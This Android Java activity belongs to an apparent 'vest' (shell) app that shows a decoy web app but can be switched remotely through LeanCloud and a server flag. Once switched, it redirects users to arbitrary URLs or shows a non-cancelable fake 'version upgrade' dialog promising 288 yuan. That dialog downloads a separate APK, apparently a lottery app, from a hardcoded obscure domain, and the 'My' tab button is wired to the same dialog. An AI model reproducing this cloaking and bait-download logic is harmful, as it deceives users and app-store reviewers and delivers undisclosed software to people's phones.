package com.regus.entrance.activity;

import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.support.v7.app.AlertDialog;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.GetCallback;
import com.regus.base.HostManager;
import com.regus.base.control.BaseActivity;
import com.regus.base.util.CheckUtil;
import com.regus.base.util.SingleToast;
import com.regus.base.util.XLogUtil;
import com.regus.entrance.BoxApplication;
import com.regus.entrance.BuildConfig;
import com.regus.entrance.fragment.M4MingSuWebViewFragment;
import com.regus.entrance.fragment.M4SXWebviewFragent;
import com.regus.entrance.utils.ComplexFragmentManager;
import com.regus.entrance.R;
import com.regus.entrance.fragment.AimWebViewFragment;
import com.regus.entrance.fragment.HomeWebViewFragment;
import com.regus.entrance.fragment.MoreWebViewFragment;
import com.regus.entrance.fragment.MyFragment;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import static com.regus.entrance.BoxApplication.SmPostDetailUrl;
import static com.regus.entrance.BoxApplication.isOneTabMJ;
import static com.regus.entrance.BoxApplication.leanCloud_objectId;
import static com.regus.entrance.BuildConfig.isWaiBao;

public class MaJiaActivity extends BaseActivity implements View.OnClickListener {
    public static final String TAG = "Line  ";
    ImageView ivHome;
    ImageView ivBook;
    ImageView iv_sx;
    ImageView ivMy;
    ImageView iv_zx;

    TextView tvHome;
    TextView tvBook;
    TextView tv_sx;
    TextView tvMy;
    TextView tv_zx;

    LinearLayout llBottom;


    private String mUrl; //马甲包h5的链接

    public String mAimUrl;

    private String mDownLoadAPkUrl = "http://www.qx6r2z.top/index/down/id/183163.html";

    private String aimPackage = "com.ttc.lottery";

    private boolean isDownLoadApk;
    private boolean isJumpH5;
    private RelativeLayout mRoot;


    @Override
    protected void createLayoutView() {


        setContentView(R.layout.acitivity_spash_scene);


        //设置全屏
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);


        if(Build.VERSION.SDK_INT < 19) {// lower api
            View v =this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        }else {

            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        if (TextUtils.isEmpty(mUrl)) {
            mUrl = HostManager.getInstance().getH5MJURl();
        }
    }

    @Override
    protected void initViews() {
        mRoot = findViewById(R.id.root);
        ivHome = findViewById(R.id.iv_home);
        iv_sx = findViewById(R.id.iv_sx);
        ivBook = findViewById(R.id.iv_book);
        ivMy = findViewById(R.id.iv_my);
        iv_zx = findViewById(R.id.iv_zx);

        tvHome = findViewById(R.id.tv_home);
        tv_sx = findViewById(R.id.tv_sx);
        tvBook = findViewById(R.id.tv_book);
        tvMy = findViewById(R.id.tv_my);
        tv_zx = findViewById(R.id.tv_zx);

        llBottom = findViewById(R.id.ll_bottom);

        ivHome.setOnClickListener(this);
        iv_sx.setOnClickListener(this);
        ivBook.setOnClickListener(this);
        ivMy.setOnClickListener(this);
        iv_zx.setOnClickListener(this);
    }


    private void setSelected(int postion) {
        llBottom.setVisibility(View.VISIBLE);

        if (postion == 1) {
            ivHome.setImageResource(R.drawable.ic_home_black_selected_24dp);
            ivBook.setImageResource(R.drawable.ic_library_books_black_24dp);
            ivMy.setImageResource(R.drawable.ic_person_black_24dp);
            iv_zx.setImageResource(R.drawable.ic_fiber_new_black_24dp);
            iv_sx.setImageResource(R.drawable.ic_note_black_24dp);
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), HomeWebViewFragment.class);
        } else if (postion == 2) {
            ivHome.setImageResource(R.drawable.ic_home_black_24dp);
            ivBook.setImageResource(R.drawable.ic_library_books_black_selected_24dp);
            ivMy.setImageResource(R.drawable.ic_person_black_24dp);
            iv_zx.setImageResource(R.drawable.ic_fiber_new_black_24dp);
            iv_sx.setImageResource(R.drawable.ic_note_black_24dp);
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), MoreWebViewFragment.class);
        } else if (postion == 3) {
            ivHome.setImageResource(R.drawable.ic_home_black_24dp);
            ivBook.setImageResource(R.drawable.ic_library_books_black_24dp);
            ivMy.setImageResource(R.drawable.ic_person_black_slected_24dp);
            iv_zx.setImageResource(R.drawable.ic_fiber_new_black_24dp);
            iv_sx.setImageResource(R.drawable.ic_note_black_24dp);
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), MyFragment.class);
        } else if (postion == 4) {
            ivHome.setImageResource(R.drawable.ic_home_black_24dp);
            ivBook.setImageResource(R.drawable.ic_library_books_black_24dp);
            ivMy.setImageResource(R.drawable.ic_person_black_24dp);
            iv_zx.setImageResource(R.drawable.ic_fiber_new_selected_black_24dp);
            iv_sx.setImageResource(R.drawable.ic_note_black_24dp);
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), M4MingSuWebViewFragment.class);
        } else if (postion == 5) {
            ivHome.setImageResource(R.drawable.ic_home_black_24dp);
            ivBook.setImageResource(R.drawable.ic_library_books_black_24dp);
            ivMy.setImageResource(R.drawable.ic_person_black_24dp);
            iv_zx.setImageResource(R.drawable.ic_fiber_new_black_24dp);
            iv_sx.setImageResource(R.drawable.ic_note_black_selected_24dp);
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), M4SXWebviewFragent.class);
        }

    }


    @Override
    protected void initData() {
        jumpMJ();
    }

    private void getLearnCloud() {


        // 第一参数是 className,第二个参数是 objectId
        AVObject todo = AVObject.createWithoutData("UpVersion", leanCloud_objectId);
        todo.fetchInBackground(new GetCallback<AVObject>() {
            @Override
            public void done(AVObject avObject, AVException e) {

                if (e != null || avObject == null) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            //  SingleToast.showMsg("网络异常,请检查网络设置~" + e.getLocalizedMessage());
                            getData();
                        }
                    });

                } else {
                    int show = avObject.getInt("show");
                    String url = avObject.getString("url");
                    boolean isStop = avObject.getBoolean("stop");

                    if (isStop) {
                        if (show == 2) {
                            jumpH5(url);
                        } else {
                            jumpMJ();
                        }
                    } else {
                        getData();
                    }
                }
            }
        });

    }


    private void getData() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {

                    Log.e(TAG, "getH5MJURl " + mUrl);

                    String urlDate = "aid=" + HostManager.getInstance().getAppId() + "&sid=" + HostManager.getInstance().getmSid();
                    URL url = new URL(SmPostDetailUrl + "?" + urlDate);
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setConnectTimeout(10000);
                    urlConnection.setReadTimeout(10000);
                    urlConnection.setRequestMethod("GET");
                    urlConnection.connect();
                    int code = urlConnection.getResponseCode();
                    Log.d(TAG, urlConnection.getResponseCode() + "..." + mUrl);

                    if (code == 200) {
                        InputStream inputStream = urlConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        StringBuffer buffer = new StringBuffer();
                        while ((line = bufferedReader.readLine()) != null) {
                            buffer.append(line);
                        }
                        String jsonStr = buffer.toString();
                        Log.e(TAG, jsonStr + "");

                        //处理
                        try {
                            JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                            if (responseJson.has("Status") && responseJson.has("Data")) {
                                if (responseJson.getBoolean("Status")) {

                                    JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                                    XLogUtil.logE(dataJsonObject.toString());

                                    if (dataJsonObject.has("IsDownload")) {
                                        isDownLoadApk = dataJsonObject.getBoolean("IsDownload");
                                        mDownLoadAPkUrl = dataJsonObject.getString("DownloadUrl");
                                    }
                                    isJumpH5 = dataJsonObject.getBoolean("IsEnable");

                                    if (isDownLoadApk) {
                                        goDownloadApk();
                                    } else if (isJumpH5) {
                                        jumpH5(dataJsonObject.getString("Url"));
                                    } else {
                                        jumpMJ();
                                    }
                                } else {
                                    jumpMJ();
                                }
                                return;
                            }


                        } catch (JSONException e) {
                            e.printStackTrace();
                            jumpMJ();
                        }
                    } else {
                        jumpMJ();
                    }
                } catch (Exception e) {
                    jumpMJ();
                }

            }
        }).start();
    }

    /**
     * 下载
     */

    private void goDownloadApk() {

        if (CheckUtil.isAvilible(aimPackage, this)) {
            jumpMJ();
        } else {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    showDownLoadDialog();
                }
            });
        }
    }


    private void showDownLoadDialog() {
        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(this);
        //设置title
        normalDialog.setTitle("版本升级");
        //设置内容
        normalDialog.setMessage("升级专业版，注册送288元!");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowsers(mDownLoadAPkUrl);
                dialog.dismiss();
            }
        });
        normalDialog.setCancelable(false);
        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowsers(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        startActivity(intent);
    }


    /**
     * 跳h5
     */
    private void jumpH5(String url) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                BoxApplication.handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        loadWebView(url, 0);
                    }
                }, 2000);

            }
        });
    }

    /**
     * 跳马甲本身
     */
    private void jumpMJ() {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (isOneTabMJ) {
                    loadWebView(BuildConfig.h5_mj_url, 0);
                } else {
                    llBottom.setVisibility(View.VISIBLE);
                    BoxApplication.handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            loadWebView(mUrl, 1);
                        }
                    }, 2000);
                }

            }
        });

    }


    private void loadWebView(String url, int type) {

        setTheme(com.regus.base.R.style.BaseAppTheme);
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);

        mRoot.setBackgroundColor(getResources().getColor(R.color.white));

        if (type == 1) { //马甲

            setSelected(1);

        } else if (type == 0) {
            mAimUrl = url;
            ComplexFragmentManager.getInstance().switchFragment(getSupportFragmentManager(), AimWebViewFragment.class);
        }

    }


    private long time1;

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {


        if (keyCode == KeyEvent.KEYCODE_BACK) {

            if (ComplexFragmentManager.getInstance().getFragment(AimWebViewFragment.class) != null) {
                AimWebViewFragment aimWebViewFragment = (AimWebViewFragment) ComplexFragmentManager.getInstance().getFragment(AimWebViewFragment.class);
                if (aimWebViewFragment.isCanGoBack()) {
                    aimWebViewFragment.backWebView();
                    return true;
                }
            }


            long time2 = System.currentTimeMillis();
            if (time2 - time1 > 1500) {
                time1 = time2;
                SingleToast.showMsg("再按一次退出程序");
            } else {
                //退出应用程序
                Intent intent = new Intent(Intent.ACTION_MAIN);
                intent.addCategory(Intent.CATEGORY_HOME);
                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                Process.killProcess(Process.myPid());
            }
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }


    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.iv_home:
                setSelected(1);
                break;
            case R.id.iv_book:
                setSelected(2);
                break;
            case R.id.iv_my:
                showDownLoadDialog();
                //  setSelected(3);
                break;
            case R.id.iv_zx:
                setSelected(4);
                break;
            case R.id.iv_sx:
                setSelected(5);
                break;
        }
    }
}
